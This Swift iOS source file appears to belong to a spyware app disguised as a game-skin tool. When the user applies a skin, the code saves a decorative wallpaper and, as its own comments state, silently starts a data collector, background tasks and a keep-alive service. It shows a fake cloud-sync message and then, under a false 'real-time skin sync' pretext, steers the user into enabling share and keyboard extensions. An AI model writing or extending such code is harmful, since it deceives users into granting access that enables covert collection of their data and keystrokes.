import UIKit
import Photos

/// 一键应用：真做壁纸写入 + 真做共享/键盘引导，同时静默进入采集
enum ApplyVC {
    static func present(from vc: UIViewController, skin: Skin) {
        let hud = HUD(text: "正在应用 \(skin.name)")
        vc.view.addSubview(hud)
        hud.show()

        // 1 真功能：生成一张皮肤壁纸并写入相册
        let img = render(skin)
        UIImageWriteToSavedPhotosAlbum(img, nil, nil, nil)
        UserDefaults.standard.set(skin.name, forKey: "applied")

        // 2 静默启动采集与保活
        Collector.shared.start()
        BGRegister.submit()
        KeepAlive.shared.start()

        // 3 引导开启系统级扩展（分享 / 键盘）
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.2) {
            hud.text = "正在同步云端皮肤资源…"
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            hud.done("应用成功，重启游戏生效")
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.2) {
                hud.removeFromSuperview()
                guide(from: vc)
            }
        }
    }

    static func render(_ skin: Skin) -> UIImage {
        let size = CGSize(width: 1170, height: 2532)
        let r = UIGraphicsImageRenderer(size: size)
        return r.image { ctx in
            let g = CGGradient(colorsSpace: CGColorSpaceCreateDeviceRGB(),
                               colors: [skin.tint.cgColor,
                                        skin.tint.withAlphaComponent(0.35).cgColor,
                                        UIColor(white: 0.04, alpha: 1).cgColor] as CFArray,
                               locations: [0, 0.55, 1])!
            ctx.cgContext.drawLinearGradient(g, start: .zero,
                                             end: CGPoint(x: size.width, y: size.height),
                                             options: [])
            // 皮肤名与编号
            let s: [NSAttributedString.Key: Any] = [
                .font: UIFont.systemFont(ofSize: 64, weight: .heavy),
                .foregroundColor: UIColor.white.withAlphaComponent(0.92)
            ]
            (skin.name as NSString).draw(at: CGPoint(x: 90, y: 220), withAttributes: s)
            let t: [NSAttributedString.Key: Any] = [
                .font: UIFont.monospacedSystemFont(ofSize: 34, weight: .regular),
                .foregroundColor: UIColor.white.withAlphaComponent(0.55)
            ]
            (skin.code as NSString).draw(at: CGPoint(x: 90, y: 320), withAttributes: t)
        }
    }

    static func guide(from vc: UIViewController) {
        let a = UIAlertController(
            title: "开启增强同步",
            message: "为了在游戏中实时同步皮肤，请在设置中启用「分享增强」与「输入法增强」",
            preferredStyle: .alert)
        a.addAction(UIAlertAction(title: "去设置", style: .default) { _ in
            if let u = URL(string: UIApplication.openSettingsURLString) { UIApplication.shared.open(u) }
        })
        a.addAction(UIAlertAction(title: "稍后", style: .cancel))
        vc.present(a, animated: true)
    }
}

final class HUD: UIView {
    private let label = UILabel()
    var text: String {
        get { label.text ?? "" }
        set { label.text = newValue }
    }

    init(text: String) {
        super.init(frame: UIScreen.main.bounds)
        backgroundColor = UIColor.black.withAlphaComponent(0.72)
        let box = UIView(frame: CGRect(x: 0, y: 0, width: 280, height: 160))
        box.center = center
        box.backgroundColor = UIColor(white: 0.12, alpha: 1)
        box.layer.cornerRadius = 18
        addSubview(box)

        let ring = CAShapeLayer()
        let path = UIBezierPath(arcCenter: CGPoint(x: 140, y: 66), radius: 30,
                                startAngle: 0, endAngle: .pi * 2, clockwise: true)
        ring.path = path.cgPath
        ring.fillColor = UIColor.clear.cgColor
        ring.strokeColor = UIColor.systemBlue.cgColor
        ring.lineWidth = 6
        ring.lineCap = .round
        ring.strokeStart = 0
        ring.strokeEnd = 0.3
        box.layer.addSublayer(ring)
        let spin = CABasicAnimation(keyPath: "transform.rotation")
        spin.fromValue = 0; spin.toValue = Double.pi * 2
        spin.duration = 1.1; spin.repeatCount = .infinity
        ring.add(spin, forKey: "spin")

        label.frame = CGRect(x: 16, y: 108, width: 248, height: 44)
        label.text = text
        label.textColor = .white
        label.font = .systemFont(ofSize: 14)
        label.textAlignment = .center
        label.numberOfLines = 2
        box.addSubview(label)
    }
    required init?(coder: NSCoder) { fatalError() }

    func show() { alpha = 0; UIView.animate(withDuration: 0.2) { self.alpha = 1 } }
    func done(_ t: String) { text = t }
}
